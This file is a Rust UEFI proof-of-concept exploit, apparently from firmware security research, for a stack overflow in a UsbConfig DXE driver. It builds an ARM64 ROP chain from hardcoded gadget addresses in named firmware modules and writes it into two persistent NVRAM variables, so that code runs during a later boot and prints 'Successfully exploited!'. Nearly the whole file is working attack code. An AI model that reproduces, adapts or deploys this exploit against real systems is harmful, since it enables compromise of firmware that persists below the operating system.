#![no_main]
#![no_std]

use uefi::guid;
use uefi::table::runtime::{VariableAttributes, VariableVendor};

use uefi::prelude::*;

#[allow(dead_code)]
fn usb_config_dxe_poc(system_table: SystemTable<Boot>) {
    let rt = system_table.runtime_services();

    // -0000000000000019 Value           DCB ?
    // ...
    // +0000000000000008
    // +0000000000000008 ; end of stack variables

    let attrs = VariableAttributes::NON_VOLATILE
        | VariableAttributes::BOOTSERVICE_ACCESS
        | VariableAttributes::RUNTIME_ACCESS;
    let vendor_guid = VariableVendor(guid!("882f8c2b-9646-435f-8de5-f208ff80c1bd"));

    let name1 = cstr16!("UsbConfigPrimaryPort");

    // aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa{Gadget1}
    // bbbbbbbb{gST->ConOut->OutputString}00000000{Gadget2}
    // cccccccccccccccccccccccc{gST->ConOut}1111111111111111{WritableAddressX29}{Gadget3}
    // dddddddddddddddddddd{Message}{InfiniteLoopAddr}

    let con_out: [u8; 8] = 0x9439f320u64.to_le_bytes();
    let writable_address_x29: [u8; 8] = 0x8e400000u64.to_le_bytes();
    let con_out_output_string: [u8; 8] = 0x92fd8cc8u64.to_le_bytes();

    // ASN1X509Dxe-c2f9a4f5-f7b4-43e7-ba99-5ea804cc103a.dxe (BS_Code offset: 0x60d000)
    // 0x0000000000004ae0: ldr x8, [sp, #8]; cbz x8, #0x4ae0; ldp x29, x30, [sp, #0x10]; add sp, sp, #0x20; ret;
    let gadget1: [u8; 8] = 0x9a904ae0u64.to_le_bytes();

    // AcpiPlatform-07598dfc-d5ec-4f00-8897-ab10426cb644.dxe (BS_Code offset: 0x6d2000)
    // 0x00000000000047cc: ldr x0, [sp, #0x18]; ldp x29, x30, [sp, #0x30]; add sp, sp, #0x40; ret;
    let gadget2: [u8; 8] = 0x9a9c97ccu64.to_le_bytes();

    // AcpiPlatform-07598dfc-d5ec-4f00-8897-ab10426cb644.dxe (BS_Code offset: 0x6d2000)
    // 0x000000000000aaf0: add x1, sp, #0x14; blr x8;
    let gadget3: [u8; 8] = 0x9a9cfaf0u64.to_le_bytes();

    // AcpiPlatform-07598dfc-d5ec-4f00-8897-ab10426cb644.dxe (BS_Code offset: 0x6d2000)
    // .text:00000000000010D8 InfiniteLoop
    let infinite_loop: [u8; 8] = 0x9a9c60d8u64.to_le_bytes();

    let message: &[u8; 52] = b"\r\x00\n\x00S\x00u\x00c\x00c\x00e\x00s\x00s\x00f\x00u\x00l\x00l\x00y\x00\x20\x00e\x00x\x00p\x00l\x00o\x00i\x00t\x00e\x00d\x00\x21\x00\x00\x00";

    let mut value: [u8; 217] = [0; 217];
    value[..33].copy_from_slice(b"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa");
    value[33..41].copy_from_slice(&gadget1[..]);
    value[41..49].copy_from_slice(b"bbbbbbbb");
    value[49..57].copy_from_slice(&con_out_output_string[..]);
    value[57..65].copy_from_slice(b"00000000");
    value[65..73].copy_from_slice(&gadget2[..]);
    value[73..97].copy_from_slice(b"cccccccccccccccccccccccc");
    value[97..105].copy_from_slice(&con_out[..]);
    value[105..121].copy_from_slice(b"1111111111111111");
    value[121..129].copy_from_slice(&writable_address_x29[..]);
    value[129..137].copy_from_slice(&gadget3[..]);
    value[137..157].copy_from_slice(b"dddddddddddddddddddd");
    value[157..209].copy_from_slice(message);
    value[209..].copy_from_slice(&infinite_loop[..]);

    rt.set_variable(name1, &vendor_guid, attrs, &value)
        .expect("failed to set variable");

    let name2 = cstr16!("UsbConfigSecondaryPort");
    rt.set_variable(name2, &vendor_guid, attrs, &value)
        .expect("failed to set variable");
}

#[entry]
fn main(_image_handle: Handle, mut system_table: SystemTable<Boot>) -> Status {
    uefi_services::init(&mut system_table).unwrap();

    usb_config_dxe_poc(system_table);

    Status::SUCCESS
}
